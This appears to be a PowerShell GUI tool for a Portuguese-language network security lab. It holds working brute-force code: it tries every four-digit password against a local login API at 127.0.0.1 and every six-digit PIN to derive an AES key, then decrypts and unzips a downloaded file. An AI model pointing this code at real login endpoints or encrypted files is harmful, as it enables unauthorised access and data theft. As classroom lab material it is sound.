Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Net.Http

[System.Windows.Forms.Application]::EnableVisualStyles()

$BaseUrl = "http://127.0.0.1:8080"
$Magic = "LABSEGURANCA2026"

function Show-Info([string]$Message) {
    [System.Windows.Forms.MessageBox]::Show($Message, "Laboratório", 'OK', 'Information') | Out-Null
}
function Show-Error([string]$Message) {
    [System.Windows.Forms.MessageBox]::Show($Message, "Laboratório", 'OK', 'Error') | Out-Null
}

$form = New-Object System.Windows.Forms.Form
$form.Text = "Laboratório de Segurança de Redes"
$form.Size = New-Object System.Drawing.Size(650, 470)
$form.StartPosition = "CenterScreen"
$form.MaximizeBox = $false
$form.FormBorderStyle = 'FixedDialog'

$tabs = New-Object System.Windows.Forms.TabControl
$tabs.Location = New-Object System.Drawing.Point(12,12)
$tabs.Size = New-Object System.Drawing.Size(610,405)
$form.Controls.Add($tabs)

# ---------------- LOGIN ----------------
$tabLogin = New-Object System.Windows.Forms.TabPage
$tabLogin.Text = "1 - Descobrir senha"
$tabs.TabPages.Add($tabLogin)

$lTarget = New-Object System.Windows.Forms.Label
$lTarget.Text = "Alvo do laboratório: $BaseUrl"
$lTarget.Location = New-Object System.Drawing.Point(20,20)
$lTarget.AutoSize = $true
$tabLogin.Controls.Add($lTarget)

$lUser = New-Object System.Windows.Forms.Label
$lUser.Text = "Usuário encontrado no PCAP:"
$lUser.Location = New-Object System.Drawing.Point(20,60)
$lUser.AutoSize = $true
$tabLogin.Controls.Add($lUser)

$tUser = New-Object System.Windows.Forms.TextBox
$tUser.Location = New-Object System.Drawing.Point(20,82)
$tUser.Size = New-Object System.Drawing.Size(260,25)
$tabLogin.Controls.Add($tUser)

$bAttack = New-Object System.Windows.Forms.Button
$bAttack.Text = "Iniciar força bruta (0000-9999)"
$bAttack.Location = New-Object System.Drawing.Point(20,125)
$bAttack.Size = New-Object System.Drawing.Size(260,34)
$tabLogin.Controls.Add($bAttack)

$progressLogin = New-Object System.Windows.Forms.ProgressBar
$progressLogin.Location = New-Object System.Drawing.Point(20,180)
$progressLogin.Size = New-Object System.Drawing.Size(550,24)
$progressLogin.Minimum = 0; $progressLogin.Maximum = 10000
$tabLogin.Controls.Add($progressLogin)

$lLoginStatus = New-Object System.Windows.Forms.Label
$lLoginStatus.Text = "Aguardando."
$lLoginStatus.Location = New-Object System.Drawing.Point(20,220)
$lLoginStatus.Size = New-Object System.Drawing.Size(550,65)
$tabLogin.Controls.Add($lLoginStatus)

$bWeb = New-Object System.Windows.Forms.Button
$bWeb.Text = "Abrir portal no navegador"
$bWeb.Location = New-Object System.Drawing.Point(20,300)
$bWeb.Size = New-Object System.Drawing.Size(260,32)
$tabLogin.Controls.Add($bWeb)
$bWeb.Add_Click({ Start-Process $BaseUrl })

$bAttack.Add_Click({
    $username = $tUser.Text.Trim()
    if ([string]::IsNullOrWhiteSpace($username)) { Show-Error "Digite o usuário identificado no PCAP."; return }
    $bAttack.Enabled = $false
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $handler = New-Object System.Net.Http.HttpClientHandler
    $client = [System.Net.Http.HttpClient]::new($handler)
    $client.Timeout = [TimeSpan]::FromSeconds(3)
    $found = $null
    try {
        for ($i = 0; $i -le 9999; $i++) {
            $candidate = $i.ToString("D4")
            $body = "username=$([uri]::EscapeDataString($username))&password=$candidate"
            $content = [System.Net.Http.StringContent]::new($body, [Text.Encoding]::UTF8, "application/x-www-form-urlencoded")
            try {
                $resp = $client.PostAsync("$BaseUrl/api/login", $content).Result
                if ([int]$resp.StatusCode -eq 200) { $found = $candidate; break }
            } catch {
                Show-Error "Não foi possível acessar o laboratório. Confirme se o Docker está ativo em $BaseUrl"
                break
            }
            if (($i % 25) -eq 0) {
                $progressLogin.Value = [Math]::Min($i,10000)
                $rate = if ($sw.Elapsed.TotalSeconds -gt 0) {[int](($i+1)/$sw.Elapsed.TotalSeconds)} else {0}
                $lLoginStatus.Text = "Tentativa: $candidate`r`nVelocidade aproximada: $rate tentativas/s"
                [System.Windows.Forms.Application]::DoEvents()
            }
        }
    } finally { $client.Dispose(); $handler.Dispose(); $sw.Stop(); $bAttack.Enabled = $true }
    if ($found) {
        $progressLogin.Value = 10000
        $lLoginStatus.Text = "SENHA ENCONTRADA: $found`r`nTempo: $([Math]::Round($sw.Elapsed.TotalSeconds,2)) s"
        Show-Info "Senha encontrada: $found`nAgora entre no portal e baixe o material criptografado."
    } elseif ($sw.Elapsed.TotalSeconds -gt 0) {
        $lLoginStatus.Text = "Senha não encontrada no espaço 0000-9999."
    }
})

# ---------------- ARQUIVO ----------------
$tabFile = New-Object System.Windows.Forms.TabPage
$tabFile.Text = "2 - Quebrar material"
$tabs.TabPages.Add($tabFile)

$lFile = New-Object System.Windows.Forms.Label
$lFile.Text = "Material criptografado baixado do portal:"
$lFile.Location = New-Object System.Drawing.Point(20,20)
$lFile.AutoSize = $true
$tabFile.Controls.Add($lFile)

$tFile = New-Object System.Windows.Forms.TextBox
$tFile.Location = New-Object System.Drawing.Point(20,44)
$tFile.Size = New-Object System.Drawing.Size(430,25)
$tabFile.Controls.Add($tFile)

$bBrowse = New-Object System.Windows.Forms.Button
$bBrowse.Text = "Procurar..."
$bBrowse.Location = New-Object System.Drawing.Point(465,42)
$bBrowse.Size = New-Object System.Drawing.Size(100,28)
$tabFile.Controls.Add($bBrowse)
$bBrowse.Add_Click({
    $dlg = New-Object System.Windows.Forms.OpenFileDialog
    $dlg.Filter = "Material criptografado (*.enc)|*.enc|Todos os arquivos (*.*)|*.*"
    if ($dlg.ShowDialog() -eq 'OK') { $tFile.Text = $dlg.FileName }
})

$bDecrypt = New-Object System.Windows.Forms.Button
$bDecrypt.Text = "Iniciar força bruta (000000-999999)"
$bDecrypt.Location = New-Object System.Drawing.Point(20,90)
$bDecrypt.Size = New-Object System.Drawing.Size(300,34)
$tabFile.Controls.Add($bDecrypt)

$progressFile = New-Object System.Windows.Forms.ProgressBar
$progressFile.Location = New-Object System.Drawing.Point(20,145)
$progressFile.Size = New-Object System.Drawing.Size(550,24)
$progressFile.Minimum = 0; $progressFile.Maximum = 1000000
$tabFile.Controls.Add($progressFile)

$lFileStatus = New-Object System.Windows.Forms.Label
$lFileStatus.Text = "Aguardando. O teste valida apenas o primeiro bloco AES para acelerar a atividade."
$lFileStatus.Location = New-Object System.Drawing.Point(20,190)
$lFileStatus.Size = New-Object System.Drawing.Size(550,80)
$tabFile.Controls.Add($lFileStatus)

$bDecrypt.Add_Click({
    $path = $tFile.Text.Trim()
    if (-not (Test-Path $path)) { Show-Error "Selecione um material criptografado válido."; return }
    $bytes = [IO.File]::ReadAllBytes($path)
    if ($bytes.Length -lt 32) { Show-Error "Arquivo inválido."; return }
    $iv = New-Object byte[] 16; [Array]::Copy($bytes,0,$iv,0,16)
    $firstCipher = New-Object byte[] 16; [Array]::Copy($bytes,16,$firstCipher,0,16)
    $expected = [Text.Encoding]::ASCII.GetBytes($Magic)
    $sha = [Security.Cryptography.SHA256]::Create()
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256; $aes.BlockSize = 128; $aes.Mode = 'CBC'; $aes.Padding = 'None'; $aes.IV = $iv
    $foundPin = $null
    $bDecrypt.Enabled = $false
    $sw = [Diagnostics.Stopwatch]::StartNew()
    try {
        for ($i = 0; $i -le 999999; $i++) {
            $pin = $i.ToString("D6")
            $key = $sha.ComputeHash([Text.Encoding]::ASCII.GetBytes($pin))
            $aes.Key = $key
            $dec = $aes.CreateDecryptor()
            try { $plainBlock = $dec.TransformFinalBlock($firstCipher,0,16) } finally { $dec.Dispose() }
            $match = $true
            for ($j=0;$j -lt 16;$j++) { if ($plainBlock[$j] -ne $expected[$j]) { $match=$false; break } }
            if ($match) { $foundPin=$pin; break }
            if (($i % 250) -eq 0) {
                $progressFile.Value = [Math]::Min($i,1000000)
                $rate = if ($sw.Elapsed.TotalSeconds -gt 0) {[int](($i+1)/$sw.Elapsed.TotalSeconds)} else {0}
                $lFileStatus.Text = "PIN testado: $pin`r`nVelocidade aproximada: $rate chaves/s"
                [System.Windows.Forms.Application]::DoEvents()
            }
        }
        if ($foundPin) {
            $key = $sha.ComputeHash([Text.Encoding]::ASCII.GetBytes($foundPin))
            $aes.Padding = 'PKCS7'; $aes.Key = $key; $aes.IV = $iv
            $cipherLen = $bytes.Length-16
            $cipherAll = New-Object byte[] $cipherLen; [Array]::Copy($bytes,16,$cipherAll,0,$cipherLen)
            $decAll = $aes.CreateDecryptor()
            try { $plainAll = $decAll.TransformFinalBlock($cipherAll,0,$cipherAll.Length) } finally { $decAll.Dispose() }
            $zipLen = $plainAll.Length-16
            $zipBytes = New-Object byte[] $zipLen; [Array]::Copy($plainAll,16,$zipBytes,0,$zipLen)
            $outDir = Join-Path ([IO.Path]::GetDirectoryName($path)) "resultado"
            if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force }
            New-Item -ItemType Directory -Path $outDir | Out-Null
            $zipPath = Join-Path $outDir "documentos.zip"
            [IO.File]::WriteAllBytes($zipPath,$zipBytes)
            $extract = Join-Path $outDir "documentos"
            [IO.Compression.ZipFile]::ExtractToDirectory($zipPath,$extract)
            $progressFile.Value = 1000000
            $lFileStatus.Text = "PIN ENCONTRADO: $foundPin`r`nArquivos extraídos em: $extract"
            Show-Info "PIN encontrado: $foundPin`nArquivos extraídos em:`n$extract"
            Start-Process explorer.exe $extract
        } else { $lFileStatus.Text = "PIN não encontrado no espaço definido." }
    } catch { Show-Error $_.Exception.Message }
    finally { $sw.Stop(); $sha.Dispose(); $aes.Dispose(); $bDecrypt.Enabled=$true }
})

[void]$form.ShowDialog()
